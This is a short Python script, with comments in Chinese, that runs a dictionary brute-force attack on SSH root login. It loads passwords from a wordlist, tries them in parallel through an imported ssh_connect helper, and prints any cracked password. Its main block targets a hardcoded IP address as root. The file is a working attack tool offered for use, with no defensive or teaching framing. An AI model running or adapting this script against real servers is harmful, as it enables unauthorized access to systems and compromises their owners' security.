#!/usr/bin/python3.4
# -*- coding=utf-8 -*-


import multiprocessing
from ssh import ssh_connect

def dos_ssh_root_passwd(ip,dict,user='root'):
	ip_passwd = []
	passwdfile = open(dict,'r').readlines()
	for passwd in passwdfile:
		ip_passwd.append((ip,passwd.strip(),user))

	pool=multiprocessing.Pool(processes=2)
	SSH_Result = pool.map(ssh_connect,ip_passwd)
	for x in SSH_Result:
		if x[0] == 1:
			print('成功破解密码:' + x[1])
			print(x[2])
			break
	else:
		print('密码破解失败！')

if __name__ == '__main__':
	import time
	t1 = time.time()
	dos_ssh_root_passwd('202.100.1.139','dict.txt','root')
	t2 = time.time()
	print(t2-t1)